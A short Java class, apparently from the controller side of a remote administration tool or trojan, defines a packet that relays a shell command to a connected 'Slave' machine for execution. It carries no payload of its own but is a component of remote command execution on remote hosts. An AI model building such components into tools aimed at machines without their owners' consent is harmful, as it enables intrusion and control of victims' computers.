package com.redpois0n.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.Slave;

public class Packet25RemoteShellExecute extends AbstractOutgoingPacket {
	
	private String command;
	
	public Packet25RemoteShellExecute(String command) {
		this.command = command;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(command);
	}

	@Override
	public byte getPacketId() {
		return 25;
	}

}
